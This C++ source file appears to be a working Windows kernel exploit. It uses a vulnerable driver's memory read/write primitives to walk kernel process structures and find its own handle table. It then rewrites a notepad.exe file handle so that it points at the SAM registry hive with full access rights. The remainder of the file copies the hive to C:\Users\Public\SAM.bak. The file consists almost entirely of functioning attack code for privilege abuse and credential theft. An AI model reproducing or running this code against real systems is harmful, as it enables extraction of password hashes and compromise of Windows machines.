#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <TlHelp32.h>
#include <algorithm>
#include <vector>
#include "DrvOps.h"
#include "GetOffsets.h"
#include "GetFileObject.h"

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR  ObjectTypeIndex;
    UCHAR  HandleAttributes;
    USHORT HandleValue;
    PVOID  Object;
    ULONG  GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG HandleCount;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

using namespace std;

struct offsets {
    ULONG64 ActiveProcessLinks;
    ULONG64 UniqueProcessId;
    ULONG64 ObjectTable;
    ULONG64 PsInitialSystemProcess;
    DWORD64 ObHeaderCookie;
} g_offsets = {
};

typedef struct _SYSTEM_MODULE_ENTRY {
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} SYSTEM_MODULE_ENTRY, * PSYSTEM_MODULE_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG Count;
    SYSTEM_MODULE_ENTRY Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

struct KernelDriver {
    std::string Name;
    uintptr_t BaseAddress;
    uint32_t Size;
};

typedef NTSTATUS(NTAPI* pNtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

DWORD64 GetNtoskrnlBase(const std::vector<KernelDriver>& drivers) {
    if (drivers.empty()) {
        return 0;
    }

    for (const auto& drv : drivers) {
        std::string nameLower = drv.Name;
        std::transform(nameLower.begin(), nameLower.end(), nameLower.begin(), ::tolower);

        if (nameLower.find("ntoskrnl.exe") != std::string::npos ||
            nameLower.find("ntkrnl") != std::string::npos) {
            return (DWORD64)drv.BaseAddress;
        }
    }

    return 0;
}


std::vector<KernelDriver> GetSortedKernelDrivers() {
    std::vector<KernelDriver> driverList;

    auto NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

    if (!NtQuerySystemInformation) return driverList;

    ULONG len = 0;
    const int SystemModuleInformation = 11;

    NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, NULL, 0, &len);

    std::vector<BYTE> buffer(len);
    NTSTATUS status = NtQuerySystemInformation(
        (SYSTEM_INFORMATION_CLASS)SystemModuleInformation,
        buffer.data(),
        len,
        &len
    );

    if (status != 0) return driverList; // STATUS_SUCCESS = 0

    auto mods = reinterpret_cast<PSYSTEM_MODULE_INFORMATION>(buffer.data());

    for (ULONG i = 0; i < mods->Count; i++) {
        SYSTEM_MODULE_ENTRY& entry = mods->Modules[i];

        KernelDriver drv;
        drv.BaseAddress = reinterpret_cast<uintptr_t>(entry.ImageBase);
        drv.Size = entry.ImageSize;

        const char* nameStart = reinterpret_cast<const char*>(entry.FullPathName) + entry.OffsetToFileName;
        drv.Name = std::string(nameStart);

        driverList.push_back(drv);
    }

    std::sort(driverList.begin(), driverList.end(), [](const KernelDriver& a, const KernelDriver& b) {
        return a.BaseAddress < b.BaseAddress;
        });

    return driverList;
}

DWORD64 getEPROCESS(HANDLE drv, DWORD64 ntoskrnlBase, DWORD pid)
{
    if (ntoskrnlBase == 0)
    {
        std::cerr << "Failed to find ntoskrnl.exe base address." << std::endl;
        return 0;
    }

    DWORD64 initialSystemProcess = ntoskrnlBase + g_offsets.PsInitialSystemProcess;  // Get EPROCESS of the System process (PID 4)
    cout << "PsInitialSystemProcess address " << initialSystemProcess << endl;

    getchar();
    // Open Driver

    getchar();
    // Read Primitive to get EPROCESS structure from System Process
    DWORD64 systemEPROCESS = 0;
    BOOL readResult = ReadPrimitive(drv, &systemEPROCESS, (LPVOID)(uintptr_t)initialSystemProcess, sizeof(DWORD64));
    cout << "System EPROCESS: " << systemEPROCESS << endl;


    // Make sure that the EPROCESS is not from the PID 4 (System)
    DWORD systemPid = 0;
    BOOL readPIDSystemResult = ReadPrimitive(drv, &systemPid, (LPVOID)(uintptr_t)(systemEPROCESS + g_offsets.UniqueProcessId), sizeof(DWORD));
    cout << "System PID: " << systemPid << endl;
    if (systemPid == pid) {
        return systemEPROCESS; // If the target process is SYSTEM (PID 4) we already have it
    }

    // Walk through the whole list
    DWORD64 headList = systemEPROCESS + g_offsets.ActiveProcessLinks;
    cout << "headList address :" << headList << endl;

    // Get first process
    DWORD64 firstProcess = 0;
    BOOL readFirstResult = ReadPrimitive(drv, &firstProcess, (LPVOID)(uintptr_t)headList, sizeof(DWORD64));
    if (!readFirstResult) {
        cout << "Failed getting first process" << endl;
    }
    cout << "First Flink: " << firstProcess << endl;


    DWORD64 currentProcess = firstProcess;
    int counter = 0;
    getchar();
    cout << "Starting while " << endl;
    while (currentProcess != headList && counter < 5000) {
        counter++;

        DWORD64 eprocess = currentProcess - g_offsets.ActiveProcessLinks;
        cout << "Checking EPROCESS " << eprocess << endl;

        // Read PID
        DWORD currentPid = 0;
        BOOL readPIDResult = ReadPrimitive(drv, &currentPid, (LPVOID)(uintptr_t)(eprocess + g_offsets.UniqueProcessId), sizeof(DWORD));
        if (!readPIDResult) {
            cout << "Error getting current PID " << endl;
        }
        cout << "Current PID " << currentPid << endl;

        if (currentPid == pid) {
            cout << "Correct EPROCESS Found " << endl;
            return eprocess;
        }

        // Read next one
        DWORD64 nextProcess = 0;
        BOOL readNextResult = ReadPrimitive(drv, &nextProcess, (LPVOID)(uintptr_t)currentProcess, sizeof(DWORD64));
        if (!readNextResult) {
            cout << "Error getting next result " << endl;
        }

        currentProcess = nextProcess;
    }

    cout << "PID Not found after checking all processes " << endl;
    return 0;
}

int getPIDbyProcName(const string& procName) {
    int pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        return 0;
    }
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    if (Process32FirstW(hSnap, &pe32) != FALSE) {
        wstring wideProcName(procName.begin(), procName.end());
        do {
            if (_wcsicmp(pe32.szExeFile, wideProcName.c_str()) == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnap, &pe32) != FALSE);
    }

    CloseHandle(hSnap);
    return pid;
}

BOOL EnableSeDebugPrivilege()
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        std::cerr << "OpenProcessToken failed: " << GetLastError() << std::endl;
        return FALSE;
    }
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
    {
        std::cerr << "LookupPrivilegeValue failed: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        return FALSE;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
    {
        std::cerr << "AdjustTokenPrivileges failed: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        return FALSE;
    }
    CloseHandle(hToken);
    return TRUE;
}

int main() {
    // 1. Enable SeDebugPrivilege for the current process
    BOOL setPriv = EnableSeDebugPrivilege();

    // 2. Get offsets
    KernelOffsets off{};
    if (!ResolveKernelOffsets(off)) {
        printf("\n[-] Failed to resolve kernel offsets\n");
        return 1;
    }

    printf("\n[+] Offsets resolved\n");

    g_offsets.ObjectTable = off.ObjectTable;
    g_offsets.ActiveProcessLinks = off.ActiveProcessLinks;
    g_offsets.UniqueProcessId = off.UniqueProcessId;
    g_offsets.PsInitialSystemProcess = off.PsInitialSystemProcess;
    g_offsets.ObHeaderCookie = off.ObHeaderCookie;

    printf("ObjectTable: 0x%llX\n", (unsigned long long)g_offsets.ObjectTable);
    printf("ActiveProcessLinks: 0x%llX\n", (unsigned long long)g_offsets.ActiveProcessLinks);
    printf("UniqueProcessId: 0x%llX\n", (unsigned long long)g_offsets.UniqueProcessId);
    printf("PsInitialSystemProcess: 0x%llX\n", (unsigned long long)g_offsets.PsInitialSystemProcess);
    printf("ObHeaderCookie: 0x%llX\n", (unsigned long long)g_offsets.ObHeaderCookie);


    // 3. List all drivers
    vector<KernelDriver> drivers = GetSortedKernelDrivers();

    // 4. Get ntoskrnl.exe address
    DWORD64 ntoskrnlBase = GetNtoskrnlBase(drivers);
    cout << "NTOSKRNL Base address " << hex << ntoskrnlBase << endl;
    getchar();

    HANDLE drv = openVulnDriver();

    DWORD pid = GetCurrentProcessId();

    // 5. Get EPROCESS of the target process
    DWORD64 eprocess = getEPROCESS(drv, ntoskrnlBase, pid);

    // 6. Open first file
    //DWORD notepadPID = getPIDbyProcName("notepad.exe");
    HANDLE hVictim = CreateFileW(L"C:\\Windows\\System32\\notepad.exe", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);

    // 7. Find ObjectTable
    DWORD64 objectTableAddr = eprocess + g_offsets.ObjectTable;

    cout << "eprocess:        " << hex << eprocess << endl;
    cout << "ObjectTable off: " << hex << g_offsets.ObjectTable << endl;
    cout << "objectTableAddr: " << hex << objectTableAddr << endl;

    if (eprocess == 0) {
        cout << "[-] eprocess is NULL, stopping" << endl;
        return 1;
    }

    getchar();
    getchar();

    DWORD64 handleTablePtr = 0;
    ReadPrimitive(drv, &handleTablePtr, (LPVOID)(uintptr_t)objectTableAddr, sizeof(DWORD64));
    cout << "HandleTable ptr: " << hex << handleTablePtr << endl;

    getchar();
    DWORD64 tableCode = 0;
    ReadPrimitive(drv, &tableCode, (LPVOID)(uintptr_t)(handleTablePtr + 0x8), sizeof(DWORD64));

    DWORD64 level = tableCode & 0x3;
    DWORD64 tableBase = tableCode & ~0x3ULL;
    cout << "TableCode: " << hex << tableCode << " | Level: " << level << " | TableBase: " << tableBase << endl;

    getchar();


    DWORD64 handleValue = (DWORD64)hVictim;
    DWORD64 entryAddress = tableBase + (handleValue / 4) * 16;
    cout << "Entry address for origial handle: " << hex << entryAddress << endl;
    getchar();

    // Read Low QWORD (ObjectPointerBits)
    DWORD64 lowQword = 0;
    ReadPrimitive(drv, &lowQword, (LPVOID)(uintptr_t)(entryAddress), sizeof(DWORD64));
    cout << "Low QWORD (encoded obj ptr): " << hex << lowQword << endl;
    getchar();



    //DWORD64 fileObj = getFileObject(L"C:\\Windows\\System32\\config\\SAM");
    HANDLE hKeepAlive = NULL;
    DWORD64 fileObj = getFileObjectByName(drv, L"C:\\Windows\\System32\\config\\SAM");
    if (fileObj == 0) {
        cout << "[-] getFileObjectByName failed" << endl;
        return 1;
    }
    cout << "Target file object" << hex << fileObj << endl;
    //getchar();

    // 8. ObHeaderCookie (not needed for ObjectPointerBits encoding, kept for reference)
    DWORD64 obHeaderCookieAddr = ntoskrnlBase + off.ObHeaderCookie;
    BYTE cookie = 0;
    ReadPrimitive(drv, &cookie, (LPVOID)(uintptr_t)obHeaderCookieAddr, sizeof(BYTE));
    cout << "[+] ObHeaderCookie: " << hex << (int)cookie << endl;

    // 9. Calculate fileObj _OBJECT_HEADER (fileObj - 0x30)
    DWORD64 fileObjectHeader = fileObj - 0x30;
    cout << "[+] fileObj OBJECT_HEADER: " << hex << fileObjectHeader << endl;

    // 10. Preserve metadata bits (bits 0-19): Unlocked + RefCnt + Attributes
    DWORD64 metadataBits = lowQword & 0xFFFFFULL;
    cout << "[+] Metadata bits: " << hex << metadataBits << endl;

    // 11. Encode new ObjectPointerBits (bits 20-63): objectHeader >> 4, 44 bits
    DWORD64 objectPointerBits = (fileObjectHeader >> 4) & 0xFFFFFFFFFFFULL;
    DWORD64 newLowQword = (objectPointerBits << 20) | metadataBits;
    cout << "[+] Original lowQword: " << hex << lowQword << endl;
    cout << "[+] New lowQword:      " << hex << newLowQword << endl;

    // Patch GrantedAccess en el HighQword del entry para asegurar lectura
    //DWORD64 highQword = 0;
    //ReadPrimitive(drv, &highQword, (LPVOID)(uintptr_t)(entryAddress + 0x8), sizeof(DWORD64));

    //cout << "[+] Current HighQword: " << hex << highQword << endl;

    //DWORD64 newHighQword = (highQword & ~0x1FFFFFFULL) | GENERIC_READ;
    //WritePrimitive(drv, (LPVOID)(uintptr_t)(entryAddress + 0x8), &newHighQword, sizeof(DWORD64));
    //cout << "[+] GrantedAccess patched" << endl;

    

    // 12. Write new lowQword to entryAddress (patch ObjectPointerBits)
    WritePrimitive(drv, (LPVOID)(uintptr_t)entryAddress, &newLowQword, sizeof(DWORD64));
    cout << "[+] ObjectPointerBits patched" << endl;


    // Patch GrantedAccess con FILE_ALL_ACCESS (specific rights, no generic)
    DWORD64 highQword = 0;
    ReadPrimitive(drv, &highQword, (LPVOID)(uintptr_t)(entryAddress + 0x8), sizeof(DWORD64));
    cout << "[+] Current HighQword: " << hex << highQword << endl;

    // 0x001F01FF = FILE_ALL_ACCESS — specific rights que el kernel valida en I/O
    DWORD64 newHighQword = (highQword & ~0x1FFFFFFULL) | 0x001F01FF;
    WritePrimitive(drv, (LPVOID)(uintptr_t)(entryAddress + 0x8), &newHighQword, sizeof(DWORD64));
    cout << "[+] GrantedAccess patched to FILE_ALL_ACCESS (0x001F01FF)" << endl;

    // 13. Verify: 
    wchar_t resolvedPath[MAX_PATH] = {};
    DWORD len = GetFinalPathNameByHandleW(hVictim, resolvedPath, MAX_PATH, VOLUME_NAME_DOS);
    if (len > 0) {
        wcout << L"[+] Handle resolves to: " << resolvedPath << endl;
    }
    else {
        wcout << L"[-] GetFinalPathNameByHandleW failed: " << GetLastError() << endl;
    }

    //getchar();

    HANDLE hDest = CreateFileW(L"C:\\Users\\Public\\SAM.bak", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDest == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create dest file: %d\n", GetLastError());
    }
    else {
        const DWORD SECTOR = 4096;
        const DWORD CHUNK = SECTOR * 16;

        BYTE* chunk = (BYTE*)VirtualAlloc(NULL, CHUNK, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!chunk) {
            printf("[-] VirtualAlloc failed: %d\n", GetLastError());
            CloseHandle(hDest);
            goto done;
        }

        DWORD64 offset = 0;
        DWORD   totalWritten = 0;

        while (TRUE) {
            OVERLAPPED ov = {};
            ov.Offset = (DWORD)(offset & 0xFFFFFFFF);
            ov.OffsetHigh = (DWORD)(offset >> 32);
            ov.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

            DWORD bytesRead = 0;
            BOOL  readOk = ReadFile(hVictim, chunk, CHUNK, NULL, &ov);
            DWORD err = GetLastError();

            if (!readOk && err == ERROR_IO_PENDING) {
                DWORD wait = WaitForSingleObject(ov.hEvent, 10000);
                if (wait == WAIT_TIMEOUT) {
                    printf("[-] ReadFile timeout at offset 0x%llX\n", offset);
                    CloseHandle(ov.hEvent);
                    break;
                }
                readOk = GetOverlappedResult(hVictim, &ov, &bytesRead, FALSE);
                err = GetLastError();
            }
            else if (readOk) {
                GetOverlappedResult(hVictim, &ov, &bytesRead, FALSE);
                err = GetLastError();
            }

            CloseHandle(ov.hEvent);

            if (!readOk || bytesRead == 0) {
                printf("[*] Read ended at offset 0x%llX | err: %d | bytes: %d\n", offset, err, bytesRead);
                break;
            }

            DWORD written = 0;
            WriteFile(hDest, chunk, bytesRead, &written, NULL);
            totalWritten += written;
            offset += bytesRead;
            printf("[+] offset 0x%llX | read %d | total %d\r", offset, bytesRead, totalWritten);

            if (bytesRead < CHUNK) break;
        }

        VirtualFree(chunk, 0, MEM_RELEASE);
        CloseHandle(hDest);
        printf("\n[+] Done: %d bytes = C:\\Users\\Public\\SAM.bak\n", totalWritten);
    }
done:;

    getchar();
    getchar();
    return 0;

    // 14. Restore original lowQword
}